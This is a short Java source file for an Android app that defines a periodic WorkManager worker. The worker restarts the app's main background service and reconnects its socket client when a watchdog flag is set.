package com.fason.app.worker;

import android.content.Context;
import android.content.Intent;
import android.os.Build;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.fason.app.core.network.SocketClient;
import com.fason.app.receiver.WatchdogReceiver;
import com.fason.app.service.MainService;

// Periodic worker for keeping service alive
public class KeepAliveWorker extends Worker {

    public KeepAliveWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        // Ensure service is running
        if (WatchdogReceiver.isActive(getApplicationContext())) {
            startServiceIfNeeded();
            ensureSocketConnected();
        }
        return Result.success();
    }

    private void startServiceIfNeeded() {
        try {
            Intent i = new Intent(getApplicationContext(), MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                getApplicationContext().startForegroundService(i);
            } else {
                getApplicationContext().startService(i);
            }
        } catch (Exception ignored) {}
    }

    private void ensureSocketConnected() {
        try {
            SocketClient client = SocketClient.getInstance();
            if (client.getSocket() != null && !client.getSocket().connected()) {
                client.reconnect();
            }
        } catch (Exception ignored) {}
    }
}
